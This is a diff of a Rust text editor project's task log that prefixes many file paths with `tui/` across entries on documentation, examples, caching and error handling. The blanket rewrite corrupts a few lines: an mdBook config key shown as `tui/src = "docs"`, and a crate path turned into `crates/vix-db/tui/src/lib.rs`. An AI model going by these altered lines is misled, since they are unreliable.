   Gutter** shows/hides without re-parsing (the loaded `Report` stays
@@ -3298,17 +3298,17 @@ and its own gate run, zero intended behavior change unless stated.
 
 ## Phase 3 — Documentation
 
-- [x] **T301 — mdBook site.** `book.toml` (`src = "docs"`) + new
+- [x] **T301 — mdBook site.** `book.toml` (`tui/src = "docs"`) + new
   `docs/SUMMARY.md` organize all 68 existing `docs/*/index.md` pages —
   no files moved — into Getting Started (10) / Guides (18, including the
   7 `for-*-users` migration pages) / Features (34 panels & tools) /
   Reference (architecture, comparison, performance, plus 3 more below) /
   Contributing (6 more below). `docs/index.md` itself is the unlisted
   `[Introduction]` prefix chapter. Found (empirically, not assumed) a
-  real mdBook footgun: a `SUMMARY.md` chapter *can* point outside `src`
+  real mdBook footgun: a `SUMMARY.md` chapter *can* point outside `tui/src`
   via `../`, and `mdbook build` doesn't error — but it also writes that
   chapter's HTML output next to its *source* file rather than under
-  `book/` (with `src = "docs"`, a `../AGENTS.md` chapter's destination
+  `book/` (with `tui/src = "docs"`, a `../AGENTS.md` chapter's destination
   becomes `book/../AGENTS.html`, i.e. a stray file at the repo root),
   scattering generated files straight into the tracked tree. Worked
   around with 9 thin wrapper pages living inside `docs/`
@@ -3318,7 +3318,7 @@ and its own gate run, zero intended behavior change unless stated.
   `contributing-security.md`, `changelog.md`) — each just an
   explanatory comment plus one `{{#include ../<path>}}` transcluding
   the real repo-root/`agents/`/`spec/` file, since mdBook's include
-  directive doesn't create a second chapter and so can't escape `src`.
+  directive doesn't create a second chapter and so can't escape `tui/src`.
   Confirmed by diffing `git status` before/after `mdbook build`: zero
   new files outside `book/`. One directory deliberately NOT in the
   book: `docs/licenses/` (bundled third-party license `.txt` files, no
@@ -3377,7 +3377,7 @@ and its own gate run, zero intended behavior change unless stated.
   All 38 crates from T302's `docs/coverage.md` closed in one pass, split
   across 4 parallel drafting agents plus 3 direct fixes, each required to
   read the crate's own spec (and, for "how to open", `crates/vix-menu`,
-  `src/app.rs`, and the T305-generated `docs/reference/actions.md`/
+  `tui/src/app.rs`, and the T305-generated `docs/reference/actions.md`/
   `keybindings-*.md`) rather than write from the name alone — several
   crate names turned out to mean something different than they sound
   like, only caught by actually reading the source:
@@ -3454,7 +3454,7 @@ and its own gate run, zero intended behavior change unless stated.
   (`docs/roam/index.md` and `docs/undo-store/index.md` each cited a
   sub-spec by its bare filename instead of the real
   `crates/<crate>/spec/<sub>/index.md` path).
-- [x] **T305 — Generated reference.** `examples/list_commands.rs` grown:
+- [x] **T305 — Generated reference.** `tui/examples/list_commands.rs` grown:
   plain `cargo run --example list_commands` keeps its original,
   side-effect-free behavior (print the palette's `>` commands to stdout);
   `-- --write` (re)generates `docs/reference/actions.md` (all 655
@@ -3474,10 +3474,10 @@ and its own gate run, zero intended behavior change unless stated.
   byte-identical run to run — verified by diffing two successive
   `--write` runs. Extracted the action-id dispatch-chain scanner
   (`DISPATCHERS`, `every_dispatchable_action_id`, `DYNAMIC_PREFIXES`) out
-  of `tests/action_catalog.rs`'s own private copy into a new
+  of `tui/tests/action_catalog.rs`'s own private copy into a new
   `vix_action_catalog::dispatch_scan` public module, so the test's
   definition of "every action id" and the generator's are the same code,
-  never two copies to keep in sync by hand — `tests/action_catalog.rs`
+  never two copies to keep in sync by hand — `tui/tests/action_catalog.rs`
   updated to call the shared version, still green. Found one real bug
   during generation, not assumed away: two `Settings` field doc comments
   use rustdoc intra-doc links (`` [`recent_files_max`](Self::recent_files_max) ``)
@@ -3517,17 +3517,17 @@ and its own gate run, zero intended behavior change unless stated.
   identical across every keymap rather than Apple-specific. Linked from
   `index.md`'s top (a "New to Vix?" line right after the ASCII
   screenshot) and added to `docs/SUMMARY.md`'s Getting Started section.
-- [x] **T307 — Man page.** New `examples/generate_man.rs` (`cargo run
-  --example generate_man`) builds `man/vix.1` with `clap_mangen` from
-  the real `Cli` clap definition. Moved `Cli` out of `src/main.rs` into
-  a new `src/cli.rs` library module (`vix::cli::Cli`, `pub` fields) so
+- [x] **T307 — Man page.** New `tui/examples/generate_man.rs` (`cargo run
+  --example generate_man`) builds `tui/man/vix.1` with `clap_mangen` from
+  the real `Cli` clap definition. Moved `Cli` out of `tui/src/main.rs` into
+  a new `tui/src/cli.rs` library module (`vix::cli::Cli`, `pub` fields) so
   the binary and the generator share one definition — they cannot drift
   apart the way a second, hand-copied `Cli` for the generator alone
-  could. `dist-workspace.toml` gained `include = ["man/vix.1"]`,
+  could. `dist-workspace.toml` gained `include = ["tui/man/vix.1"]`,
   verified (not assumed) with `dist generate --mode ci --check` that
   this doesn't itself change the generated `release.yml` — confirmed by
   actually running `dist` 0.32.0 locally (the same version pinned in
-  `cargo-dist-version`), not just reading its docs. `man/vix.1` is
+  `cargo-dist-version`), not just reading its docs. `tui/man/vix.1` is
   committed (generated content the release pipeline reads as-is, same
   choice as `docs/reference/`), regenerate-and-diff gated on all three
   forges plus `scripts/check`. `docs/cli/index.md` gained a "Man page"
@@ -3671,11 +3671,11 @@ and its own gate run, zero intended behavior change unless stated.
     never executed against real vix): `db-workbench.tape`'s add-connection
     sequence was missing the `Name` field entirely and one `Down` short of
     reaching `File` (fixed: types a name, two `Down`s not one); a shared
-    `examples/demo-workspace/rust-app/src/main.rs` between `overview.tape`
+    `tui/examples/demo-workspace/rust-app/src/main.rs` between `overview.tape`
     (which saves an edit to it) and `themes.tape` (opened after it,
     alphabetically) meant a second tape in the same batch could see the
     first one's edit — fixed in both `render-demos.sh` and
-    `render-demos-lite.sh`: `git checkout -- examples/demo-workspace`
+    `render-demos-lite.sh`: `git checkout -- tui/examples/demo-workspace`
     before the batch starts.
   - **Three real product gaps found the same way — `git.stage_hunk`/
     `git.unstage_hunk`, `org.link.follow`/`roam.backlinks`/`roam.graph`,
@@ -3754,7 +3754,7 @@ and its own gate run, zero intended behavior change unless stated.
 
 ## Phase 5 — Examples
 
-- [x] **T501 — Demo workspace.** `examples/demo-workspace/`: a small
+- [x] **T501 — Demo workspace.** `tui/examples/demo-workspace/`: a small
   realistic project — Rust + Python + Markdown sources with intentional
   TODO/FIXME tags, `tasks.toml`, an `.http` file against
   httpbin-style endpoints, `org/` with a few roam-linked notes and a
@@ -3774,7 +3774,7 @@ and its own gate run, zero intended behavior change unless stated.
   vix-lsp-core, open a doc, print diagnostics), `i18n_lookup` (one key in
   all 15 locales), `calculator_eval`. **Done 2026-09-14.** Two real
   drifts found and corrected against this entry's own wording: `vix-query`
-  (T151 folded it into `src/app.rs`) was never "a directory search" at
+  (T151 folded it into `tui/src/app.rs`) was never "a directory search" at
   all — it's `Decision`, the query-*replace* confirm choice — so
   `query_search` instead drives `App::search_workspace_to_dock` (the real
   directory-search engine, `crates/vix-workspace-search`) through
@@ -3782,16 +3782,16 @@ and its own gate run, zero intended behavior change unless stated.
   `vcard_parse` parses *Org* contacts and exports *to* vCard, not the
   other way — there's no vCard-file parser in `vix-org-contacts` to run
   in reverse. Both corrections are documented in the examples' own doc
-  comments. `lsp_headless` reuses `tests/lsp_smoke.rs`'s mock-server
+  comments. `lsp_headless` reuses `tui/tests/lsp_smoke.rs`'s mock-server
   technique (spawn, `initialize`, `didOpen`, `publishDiagnostics`) so it
   needs only Python 3, no real language server. All 6 verified by
   actually running them, not just compiling; `cargo clippy --all-targets
   -- -D warnings` clean.
-- [x] **T504 — Config examples.** `examples/config/`: fully-annotated
+- [x] **T504 — Config examples.** `tui/examples/config/`: fully-annotated
   `config.toml` covering every settings key (cross-check against T305's
   generated settings reference), a custom theme JSON, custom user
   snippets, a `macros.toml`, and sample Rhai scripts (after T105). **Done
-  2026-09-14.** Sample Rhai scripts already existed at `examples/scripts/`
+  2026-09-14.** Sample Rhai scripts already existed at `tui/examples/scripts/`
   (T105) — nothing to duplicate. `config.toml`'s 63 keys, values, and doc
   comments were generated from the real `Settings::default()` (via
   `toml::to_string_pretty`) and `docs/reference/settings.md` rather than
@@ -3914,14 +3914,14 @@ measured problem today. Everything else actionable in this run is closed.
   `lto = true` — it's been `lto = "thin"` since this same session's
   earlier i18n/LTO-miscompilation fix (see T406's entry).
 - [x] **T510 — Per-frame git-gutter diff has no revision cache.**
-  `src/ui.rs`'s `draw()` calls `app.refresh_git_gutter()`
-  (`src/app/git.rs`) on *every redraw* for any git-tracked file (i.e.
+  `tui/src/ui.rs`'s `draw()` calls `app.refresh_git_gutter()`
+  (`tui/src/app/git.rs`) on *every redraw* for any git-tracked file (i.e.
   almost always), which does a full `Code::get_content()` (O(n) rope→
   String) plus a full `similar::TextDiff` Myers diff against the HEAD
   blob — unconditionally, even when nothing changed since the last
   frame (a cursor move, a resize). The sibling `refresh_git`'s own doc
   comment says "not per-frame"; that discipline wasn't applied here.
-  Unmeasured by the existing benches (`benches/editor_ops.rs` never
+  Unmeasured by the existing benches (`tui/benches/editor_ops.rs` never
   calls `ui::draw()`). For a large tracked file this directly threatens
   the keypress-to-frame budget T121/T122 established. **Done 2026-09-19**:
   new `App::git_gutter_cache_key: Option<(PathBuf, u64)>` field; `refresh_
@@ -3931,7 +3931,7 @@ measured problem today. Everything else actionable in this run is closed.
   Myers diff only runs on a genuine miss. `refresh_git` (HEAD moved)
   clears the cache key alongside the existing HEAD-blob cache clear. New
   test `git_gutter_refresh_skips_recompute_until_the_buffer_revision_
-  changes` (`tests/integration/git.rs`) proves the cache hit doesn't
+  changes` (`tui/tests/integration/git.rs`) proves the cache hit doesn't
   repopulate cleared marks and a real edit does invalidate it; all 10
   `git::*` tests (`--ignored`) still pass.
 - [x] **T511 — Sticky-scroll header and breadcrumbs recompile a regex and
@@ -3949,7 +3949,7 @@ measured problem today. Everything else actionable in this run is closed.
   had `&App` — sticky-scroll/breadcrumb are read-only rendering queries,
   and `draw_breadcrumb` deliberately keeps `&App` rather than becoming
   the one `&mut App` exception among "immutable reads" render calls, per
-  the comment in `src/ui.rs`'s `draw`). Tab *index* is part of the key,
+  the comment in `tui/src/ui.rs`'s `draw`). Tab *index* is part of the key,
   not just path, because both callers must also work for untitled
   buffers (`path: None`), where two different tabs could otherwise share
   a `(None, 0)` key. New tests: `breadcrumb_symbols_cache_tracks_edits_
@@ -3958,7 +3958,7 @@ measured problem today. Everything else actionable in this run is closed.
   shows_enclosing_scope_when_scrolled` (a scroll with no edit must still
   find the right cached entry) both pass.
 - [x] **T512 — Minimap clones the whole buffer, once per line, every
-  frame it's visible.** `src/ui/minimap.rs`: `tab.text().lines().map(
+  frame it's visible.** `tui/src/ui/minimap.rs`: `tab.text().lines().map(
   str::to_string).collect()` — full rope→String plus a fresh `String`
   per line, unconditional on whether the buffer changed. `viewport.
   show_minimap` defaults off, so lower priority than T510/T511, but
@@ -3974,12 +3974,12 @@ measured problem today. Everything else actionable in this run is closed.
   `str::lines()`, which drops the final phantom empty line a trailing
   `\n` produces — the two were previously counting lines two different
   ways. New test `minimap_renders_a_bar_per_line_band_without_panicking`
-  (`tests/integration/panels.rs`) renders it via `TestBackend` with a
+  (`tui/tests/integration/panels.rs`) renders it via `TestBackend` with a
   trailing-newline buffer (the edge that inconsistency touched) and
   checks for real bar glyphs; pre-existing `minimap_click_jumps_to_
   proportional_line` still passes.
 - [x] **T513 — Criterion benches exist but never run in CI, and don't
-  cover the T510/T511 hot paths.** `benches/{text_ops,editor_ops,
+  cover the T510/T511 hot paths.** `tui/benches/{text_ops,editor_ops,
   search_and_palette,startup}.rs` are real (wired via root `Cargo.toml`
   `[[bench]]`) but deliberately local-only per `spec/test/index.md`
   ("too slow to relink for a benchmark someone reruns often") — so
@@ -3987,7 +3987,7 @@ measured problem today. Everything else actionable in this run is closed.
   path, and none of the four files benchmark `vix-git::diff_marks` or
   `vix-palette::symbols` at all, meaning even a local `cargo bench` run
   today wouldn't catch T510/T511. **Done 2026-09-19** (the small half):
-  new `benches/frame_ops.rs`, two groups (`git/diff_marks`,
+  new `tui/benches/frame_ops.rs`, two groups (`git/diff_marks`,
   `palette/symbols`) at 1k/20k/100k lines, wired into root `Cargo.toml`'s
   `[[bench]]` list and `spec/test/index.md`'s bench table; smoke-tested
   with `cargo bench --bench frame_ops -- --test` (all 6 cases pass).
@@ -4025,7 +4025,7 @@ measured problem today. Everything else actionable in this run is closed.
   un-split piece left in two otherwise fully-modularized crates.**
   `vix-db` already has 17 sibling submodules covering every concern
   except the top-level key-dispatch/view state machine; `vix-org` has
-  only `columns.rs` split out so far. Same shape `src/app.rs`/`src/ui.rs`
+  only `columns.rs` split out so far. Same shape `tui/src/app.rs`/`tui/src/ui.rs`
   were in before T141/T142 (which proved out reusable extraction tooling
   — `extract_app_module.py`/`extract_ui_module.py`). Not a rule
   violation (no stated repo-wide max-file-size rule), just a real
@@ -4053,7 +4053,7 @@ measured problem today. Everything else actionable in this run is closed.
     `PendingConnect` needed `pub(crate)` (referenced from `lib.rs`'s
     `Browser` struct field); `key_connections`/`key_form`/
     `key_password` needed `pub(super)` (called from `lib.rs`'s
-    `handle_key` dispatcher) — same visibility pattern `src/app/*.rs`'s
+    `handle_key` dispatcher) — same visibility pattern `tui/src/app/*.rs`'s
     own split already established, since `Browser` (like `App`) is
     defined in the parent module the new file is a child of.
   - **`vix-db` slice 2/~5, done**: `execute.rs` — running SQL: the
@@ -4097,7 +4097,7 @@ measured problem today. Everything else actionable in this run is closed.
     small `SchemaColumns`/`SchemaRels` type aliases). `lib.rs`
     2,340→2,074 lines. The one slice so far needing `pub mod` rather
     than a plain private `mod`: `AiRequest` crosses the crate boundary
-    (`src/app.rs` calls `Browser::take_ai_request` directly), so keeping
+    (`tui/src/app.rs` calls `Browser::take_ai_request` directly), so keeping
     the module private would have left a `pub` type unreachable from
     outside the crate — caught immediately by `cargo doc`'s
     `private-intra-doc-links` check (`RUSTDOCFLAGS="-D warnings"`,
@@ -4173,7 +4173,7 @@ measured problem today. Everything else actionable in this run is closed.
     `pub use mod_name::{a, b, c};` re-export list at the crate root
     (never a wildcard) so external callers keep calling
     `vix_org::function_name(...)` in the crate's flat namespace
-    (confirmed via `src/app/org.rs`, which calls e.g.
+    (confirmed via `tui/src/app/org.rs`, which calls e.g.
     `crate::org::nav_parent` directly).
     - **`vix-org` slice 1/~6, done**: `headline_nav.rs` — headline
       location and structure editing: finding the headline governing a
@@ -4373,7 +4373,7 @@ measured problem today. Everything else actionable in this run is closed.
   explaining the names are a naming *contract* with `rust_i18n`'s own
   macro-generated code, not unfinished internal code (a new clippy lint
   this session hadn't hit before). Fixed one accidental collision with
-  `tests/i18n_keys.rs` (a repo-root scanner asserting every literal
+  `tui/tests/i18n_keys.rs` (a repo-root scanner asserting every literal
   `t!("...")` key exists in `locales/`): a deliberately-missing test key
   needed to be bound to a variable first, not passed as a literal, to
   dodge the scanner (documented inline, and a case worth remembering for
@@ -4385,7 +4385,7 @@ measured problem today. Everything else actionable in this run is closed.
   `agents/conventions.md`'s rule: an internal refactor with zero
   user-visible behavior change doesn't get one. Full workspace test
   suite (every crate, 0 failures, including the `vix-menu`/
-  `tests/i18n_keys.rs` translation-coverage guards) and full
+  `tui/tests/i18n_keys.rs` translation-coverage guards) and full
   `scripts/check`-equivalent gate green.
 
 ## Run H (second self-audit pass, 2026-09-19)
@@ -4414,7 +4414,7 @@ below) to verify against.
 
 - [x] **T518 — `node_insert_transclusion` is missing the `create_dir_all`
   its sibling `roam_insert_link` has, a real bug from copy-paste drift.**
-  `src/app/roam.rs`: both functions share an identical "find or create
+  `tui/src/app/roam.rs`: both functions share an identical "find or create
   the node's file" preamble, but `roam_insert_link` (introducing commit
   `a913aa3`) creates the target directory first
   (`std::fs::create_dir_all(parent)`) before `roam_insert_link` on
@@ -4428,12 +4428,12 @@ below) to verify against.
   callers use; this is its "don't open" sibling. Small effort, real bug.
   **Done 2026-09-19**: added `App::roam_find_or_create_node`, both call
   sites now delegate to it. New test `roam_node_insert_and_transclusion_
-  recreate_a_missing_root` (`tests/integration/editing.rs`) deletes the
+  recreate_a_missing_root` (`tui/tests/integration/editing.rs`) deletes the
   workspace root between the two calls and proves both actions still
   succeed — it would have failed on `node.insert_transclusion` before
   this fix.
 - [x] **T519 — `is_repo`/`nothing_staged` guard clauses copy-pasted 13+
-  times in `src/app/git.rs`.** The 3-line
+  times in `tui/src/app/git.rs`.** The 3-line
   `if !crate::git::is_repo(&self.root) { self.status = t!(...); return; }`
   guard appears verbatim at 13 call sites (plus 2 `AppFlags::GIT_REPO`
   variants), and the "nothing staged" guard opens both
@@ -4494,7 +4494,7 @@ below) to verify against.
   *before* T509's count fix earlier this run — T509 caught two of the
   three mentions, missed this third one).
 - [x] **T522 — `revert_hunk`/`resolve_conflict` share an identical
-  8-line "commit the rebuilt buffer" tail.** `src/app/git.rs:438-447`
+  8-line "commit the rebuilt buffer" tail.** `tui/src/app/git.rs:438-447`
   and `:471-479` are byte-for-byte identical (set content/cursor/
   selection/dirty/preview, refresh gutter, set status) except the final
   status key. Fix: `fn apply_rebuilt_buffer(&mut self, rebuilt: &str,
@@ -4502,10 +4502,10 @@ below) to verify against.
   implemented exactly as scoped (the `t!(status_key)` runtime-key
   pattern already exists elsewhere, e.g. `git_op`'s `ok_key`). Both
   `revert_hunk_restores_committed_text` and
-  `conflict_resolve_keeps_chosen_side` (`tests/integration/editing.rs`)
+  `conflict_resolve_keeps_chosen_side` (`tui/tests/integration/editing.rs`)
   still pass.
 - [x] **T523 — Throwaway git-repo bootstrap reimplemented 13 times
-  across `tests/integration/{git,editing}.rs`.** No shared helper in
+  across `tui/tests/integration/{git,editing}.rs`.** No shared helper in
   `common.rs`, so every test needing a real repo hand-rolls the same
   `run` closure + `init -q` + two `config` calls (13 sites total), each
   preceded by a redundant `fs::create_dir_all` (`unique_dir` already
@@ -4631,13 +4631,13 @@ below) to verify against.
   dedup, per T309's rule; the rendered tooltip text is unchanged).
   Verified: `cargo clippy --workspace --all-targets -- -D warnings`
   clean; `cargo test -p vix-menu` (11 tests, including the new one) and
-  the workspace-wide `tests/i18n_keys.rs` structural tests (catalog
+  the workspace-wide `tui/tests/i18n_keys.rs` structural tests (catalog
   completeness, placeholder-fill checks) all pass; `scripts/check-docs`
   green.
 - [x] **T528 — `stage_hunk`/`unstage_hunk` share ~20 lines of identical
   setup and an identical `stage_content` dispatch/report tail; only the
   middle (staging vs. unstaging logic) genuinely differs.**
-  `src/app/git.rs:524-579` and `:585-639`. Medium effort — the shared
+  `tui/src/app/git.rs:524-579` and `:585-639`. Medium effort — the shared
   edges are easy to extract, the middle needs care not to conflate.
   **Done 2026-09-20**: extracted the shared preamble into
   `App::active_hunk_context(&mut self, failed_key: &str) -> Option<(Hunk,
@@ -4660,7 +4660,7 @@ below) to verify against.
   `unstage_hunk_removes_the_cursor_hunk_from_index`,
   `revert_hunk_restores_committed_text`) still pass unchanged; full
   `scripts/check` green.
-- [x] **T529 — `src/app/picker_panels.rs`: near-identical key/mouse
+- [x] **T529 — `tui/src/app/picker_panels.rs`: near-identical key/mouse
   dispatch duplicated across 4 list panels (~120 lines).** `ascii_mouse`
   (148-163), `x11_mouse` (228-243), `media_type_mouse` (461-476) are
   textually identical apart from field name and insert callback; the
@@ -4695,7 +4695,7 @@ below) to verify against.
   `vix-color-converter-tool::from_hex`, a deliberately stricter public
   API). Picker footer hint strings duplicated verbatim: `ui.snippets_
   hint`/`ui.media_types_hint` and `ui.tasks_hint`/`ui.scripts_hint`
-  (`locales/ui.yml`). AI-replace polling loop (`tests/integration/
+  (`locales/ui.yml`). AI-replace polling loop (`tui/tests/integration/
   ai.rs:30-38` vs. inlined in `git.rs:157-162`) and a custom-dir-and-
   settings app-builder (`ai.rs:16-27` vs. `git.rs:145-150`) each
   duplicated once — promote `wait_for` to `common.rs`, add `app_at_
@@ -4709,7 +4709,7 @@ below) to verify against.
     delegate to it (the latter just reformats the tuple into its
     `"[r, g, b]"` JSON string). Crate count 119→120.
   - Test helpers: added `app_at_with(root, settings)` and
-    `wait_for_ai_replace(app, pred)` to `tests/integration/common.rs`
+    `wait_for_ai_replace(app, pred)` to `tui/tests/integration/common.rs`
     exactly as scoped; `ai.rs`'s `app_with_canned_ai_reply` now builds on
     `app_at_with` instead of repeating `App::new`/`with_session_path`/
     `layout.editor`, and both `ai.rs` and `git.rs` now call the shared
@@ -4760,7 +4760,7 @@ below) to verify against.
   `finish_connect`'s body to a background thread mirroring `session::
   worker`'s existing pattern, with a `poll_connect` drained each
   event-loop tick — same shape as `poll_command`/`poll_ai_replace`/
-  `poll_http` already established in `src/app.rs`. **Medium-large
+  `poll_http` already established in `tui/src/app.rs`. **Medium-large
   effort, highest-severity finding of this run** — real, but risky to
   rush in a security-sensitive area (DB connections); scope as its own
   focused change with its own test pass rather than folding into a
@@ -4779,7 +4779,7 @@ below) to verify against.
     the UI thread. `Browser::begin_connect` starts it and stores a new
     `pending_connect: Option<PendingConnect>`; the new `poll_connect`
     (called each tick from `App::poll_db_connect`, wired into
-    `src/main.rs`'s loop and its busy-timeout list exactly like the
+    `tui/src/main.rs`'s loop and its busy-timeout list exactly like the
     other `poll_*`s) drains it — into the workbench on success, onto the
     password prompt on `NeedsPassword`, or back to the connections list
     with the error on failure. `start_connect` and the password prompt's
@@ -4811,7 +4811,7 @@ below) to verify against.
   - Genuinely new risk introduced: `ConnectOutcome`/`Session` now cross
     a thread boundary (`Send`, verified by the crate compiling — neither
     type holds anything non-`Send`). Fixed all 4 test-suite fallout
-    sites this uncovered: `tests/db_smoke.rs`'s `key()` helper (its
+    sites this uncovered: `tui/tests/db_smoke.rs`'s `key()` helper (its
     `drain_query` renamed `drain_async`, now also draining
     connect/reconnect — every one of its ~11 "connect via Enter, assert
     `View::Workbench`" call sites keeps working unmodified), one
@@ -4837,7 +4837,7 @@ below) to verify against.
     clean; `cargo test -p vix-db` (114 tests) and `cargo test --test
     db_smoke -- --include-ignored` (12 tests, all needing real SQLite
     fixtures) both fully green; the workspace-wide
-    `tests/i18n_keys.rs` structural tests pass (the reshaped
+    `tui/tests/i18n_keys.rs` structural tests pass (the reshaped
     `msg.db_connecting` key checked for real call-site placeholder
     agreement); full `cargo test --workspace` green;
     `scripts/check-docs` green.
@@ -4933,7 +4933,7 @@ below) to verify against.
   production) permanently poisons the process-wide static, cascading
   into every subsequent call (both are read on essentially every frame
   render). `vix-clipboard`, `vix-terminal`, and two `Arc<Mutex<Child>>`
-  sites in `src/app.rs` already guard against exactly this with
+  sites in `tui/src/app.rs` already guard against exactly this with
   `unwrap_or_else(PoisonError::into_inner)`, one with an explicit
   comment explaining why. Low real-world risk in production (the code
   held under these two locks is trivial, panic-free field access/
@@ -4983,7 +4983,7 @@ below) to verify against.
   adapter's `message` field for every DAP request except `evaluate`
   (`initialize`, `launch`, `configurationDone`, `setBreakpoints`,
   `continue`/`next`/`stepIn`/`stepOut`/`pause`). LSP has the equivalent
-  right (`LspEvent::RequestFailed`, surfaced in `src/app/lsp_dap.rs`);
+  right (`LspEvent::RequestFailed`, surfaced in `tui/src/app/lsp_dap.rs`);
   DAP has no counterpart. Fix: add a `DapEvent::RequestFailed(String)`
   variant, check `success` in the `Other` arm, surface it the same way
   LSP's failures already are. Medium effort. **Done 2026-09-20**: went
@@ -5000,7 +5000,7 @@ below) to verify against.
   integration test would have been the odd one out. New
   `status.dap_request_failed` mirrors the existing
   `status.lsp_request_failed` exactly (`"Debugger: %{message}"`, same
-  as `"Language server: %{message}"`), surfaced in `src/app.rs`'s
+  as `"Language server: %{message}"`), surfaced in `tui/src/app.rs`'s
   `DapEvent` match arm right next to the LSP one it mirrors.
 - [x] **T537 — A settings-file syntax error silently resets everything
   to defaults on next launch, with zero notification.**
@@ -5080,13 +5080,13 @@ below) to verify against.
   errors classify correctly through the actual `send`/`poll` path, not
   just a synthetic `sqlx::Error` fed straight to the classifier, one
   proving the `Display` fallback) and `cargo test --test db_smoke --
-  --include-ignored` (12 tests) both green; `tests/i18n_keys.rs`
+  --include-ignored` (12 tests) both green; `tui/tests/i18n_keys.rs`
   structural tests confirm the new locale key's placeholder is filled
   correctly at its one call site; full `cargo test --workspace` and
   `scripts/check-docs` green.
 - [x] **T539 — The five most common user actions (save/open/revert/
   rename/delete) show generic errors with no filename, though the path
-  is in scope at every site.** `src/app.rs`: Ctrl+S save (`:3651-3654`,
+  is in scope at every site.** `tui/src/app.rs`: Ctrl+S save (`:3651-3654`,
   `msg.save_failed`), open file (`:7301-7304`, `msg.open_failed`),
   revert buffer (`:5865`, wrongly reuses `msg.open_failed`), rename
   (`:13193-13195`, `msg.rename_failed`, names neither old nor new path),
@@ -5114,13 +5114,13 @@ below) to verify against.
 - [x] **T540 — `vix-git::stage`/`unstage` return a bare `bool`,
   discarding git's real stderr — inconsistent with their own sibling.**
   `crates/vix-git/src/lib.rs:498-500,568-571` collapse the command
-  result to `bool`; the caller (`src/app/git.rs:744-747`) can only show
+  result to `bool`; the caller (`tui/src/app/git.rs:744-747`) can only show
   a static, non-interpolated `"Git command failed"` on failure. The
   sibling `stage_content` (same file, line 520) already does this
   right — `Result<(), String>` with the real stderr — this is an
   internal inconsistency, not a systemic constraint. Medium/large
   effort (touches the function signatures and both call sites' i18n).
-  **Done 2026-09-20**, turned out smaller than scoped: `src/app/git.rs`
+  **Done 2026-09-20**, turned out smaller than scoped: `tui/src/app/git.rs`
   already had a second sibling, `git_op` (stash/stash-pop/amend),
   reporting exactly this shape via an existing `msg.git_failed_reason`
   key — `git_stage_selected` just hadn't been converted to match when
@@ -5137,7 +5137,7 @@ below) to verify against.
   references the removed key.
 - [x] **T541 — `ensure_speller` discards a well-designed 3-variant
   `Error` enum, going "silently inert" exactly as its own doc comment
-  admits — but that admission never reaches the user.** `src/app.rs:
+  admits — but that admission never reaches the user.** `tui/src/app.rs:
   4496`: `self.speller = crate::spellcheck::load_for(...).ok();`.
   `vix_spellcheck::Error` (`crates/vix-spellcheck/src/lib.rs:34`)
   distinguishes `Io` (permissions/path), `Parse` (malformed
@@ -5158,14 +5158,14 @@ below) to verify against.
   mutating the global i18n locale, matching how the file's other
   spellcheck tests already avoid both.
 - [x] **T542 — Clipboard "yank" operations in two places claim success
-  even when the clipboard write silently failed.** `src/app/org.rs:
-  979-980` ("Copied %{url} to the clipboard") and `src/app/org_table.rs:
+  even when the clipboard write silently failed.** `tui/src/app/org.rs:
+  979-980` ("Copied %{url} to the clipboard") and `tui/src/app/org_table.rs:
   325-326` ("Sum: %{sum} (copied to the clipboard)") show their success
   message unconditionally, not gated on `vix_clipboard::set`'s actual
   result — unlike the established fallback pattern in `crates/
   vix-editor-core/src/editor.rs:645-653`, which sets an in-memory
   fallback and (implicitly) knows when the real clipboard write failed.
-  Two more sites (`src/app/modal.rs:509`, `src/app/org.rs:379`) also
+  Two more sites (`tui/src/app/modal.rs:509`, `tui/src/app/org.rs:379`) also
   bypass the checked pattern without the false-success claim. One layer
   down, `crates/vix-clipboard/src/lib.rs:72,89` wraps `arboard::Error`
   via `.map_err(|e| anyhow!(e.to_string()))` rather than
@@ -5190,7 +5190,7 @@ below) to verify against.
   `serde_yaml`'s line/column diagnostics, showing only a static "not
   valid JSON or YAML."** `crates/vix-edit-value/src/lib.rs:117-119`:
   `serde_yaml::from_str(text).ok()?` throws away the parser's own
-  location detail; the caller (`src/app.rs:9639`) has nothing better to
+  location detail; the caller (`tui/src/app.rs:9639`) has nothing better to
   show. Fix: change `from_text` to return `Result<Self, String>` and
   surface the real message. Medium effort. **Done 2026-09-20**,
   implemented exactly as scoped. `msg.edit_value_parse` (single call
@@ -5205,11 +5205,11 @@ below) to verify against.
   `editing::edit_json_*` integration tests pass.
 - [x] **T544 — `save_session` discards its error silently while the
   identical-shaped `store_settings` two lines below is handled
-  properly.** `src/app.rs:13419-13428`: `self.save_session();` (root:
-  `src/app/session.rs:227`, `let _ = self.store_session(&session);`)
+  properly.** `tui/src/app.rs:13419-13428`: `self.save_session();` (root:
+  `tui/src/app/session.rs:227`, `let _ = self.store_session(&session);`)
   vs. `store_settings()` right below, wrapped in `if let Err(e) = ...`.
   Also worth checking in the same fix: the settings-save warning is
-  queued immediately before process exit (`src/main.rs:152`) with no
+  queued immediately before process exit (`tui/src/main.rs:152`) with no
   further render tick, so it may never actually be seen either — same
   root issue as T539's "the user needs to see this before exit"
   concern, just for the settings/session case instead of a save/open
@@ -5230,14 +5230,14 @@ below) to verify against.
   and the settings save still succeeds independently.
 - [x] **T545 — Several settings/state writes after an explicit user
   action are silently discarded, at 6+ sites with the same shape.**
-  `src/app/session.rs:381` (`open_settings_file` doesn't save settings
-  first, no warning), `src/app/org.rs:850,864,872` (agenda file add/
+  `tui/src/app/session.rs:381` (`open_settings_file` doesn't save settings
+  first, no warning), `tui/src/app/org.rs:850,864,872` (agenda file add/
   remove/clear discard `store_settings()`, then unconditionally show
-  success), `src/app/picker_panels.rs:402` (theme "Save As" persists
+  success), `tui/src/app/picker_panels.rs:402` (theme "Save As" persists
   the theme JSON carefully but discards the active-selection save),
-  `src/app.rs:9581,9588,9595` (DB connection list/query history/saved
+  `tui/src/app.rs:9581,9588,9595` (DB connection list/query history/saved
   queries discarded after explicit user actions), and `crates/vix-db/
-  src/lib.rs:938` (OS-keyring password store discarded after the user
+  tui/src/lib.rs:938` (OS-keyring password store discarded after the user
   explicitly opts into "remember password"). Fix: reuse the existing
   `self.messages.error`/Warn pattern already used elsewhere in the same
   files at each site. Small effort each; batch together if picked up.
@@ -5299,7 +5299,7 @@ case-insensitive filesystems correctly).
 
 - [x] **T547 — Every "run an external command" feature hard-depends on
   a POSIX `sh` with no Windows path — breaks whole feature classes, not
-  just degrades them, on stock Windows.** Two sites in `src/app.rs`:
+  just degrades them, on stock Windows.** Two sites in `tui/src/app.rs`:
   `spawn_ai_cli` (`:10241`, the CLI-mode AI assistant) and
   `run_command_in` (`:13227`, "the one async pipeline every
